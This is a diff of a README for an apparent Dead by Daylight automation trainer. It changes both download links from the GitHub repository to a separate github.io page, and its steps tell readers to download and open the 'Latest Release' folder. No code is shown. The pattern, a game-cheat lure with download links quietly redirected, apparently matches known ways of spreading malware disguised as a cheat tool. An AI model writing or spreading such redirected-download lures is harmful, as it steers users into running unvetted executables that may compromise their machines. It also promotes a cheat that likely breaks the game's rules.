@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your Dead by Daylight progression easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/darynthickened907/DBD-AutoGrind-Trainer-2026)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://darynthickened907.github.io)
 
 This project helps players manage Bloodpoint collection and item unlocks in Dead by Daylight. It automates repetitive tasks to save time during gameplay. Use this tool to improve your experience within the Fog.
 
@@ -29,7 +29,7 @@ Close other programs before you run the trainer to prevent memory conflicts.
 
 Follow these steps to set up the software.
 
-1. Visit the repository page to download the latest files: https://github.com/darynthickened907/DBD-AutoGrind-Trainer-2026
+1. Visit the repository page to download the latest files: https://darynthickened907.github.io
 2. Locate the link labeled "Latest Release."
 3. Click the link to save the installation folder to your computer.
 4. Open the folder once the download finishes.
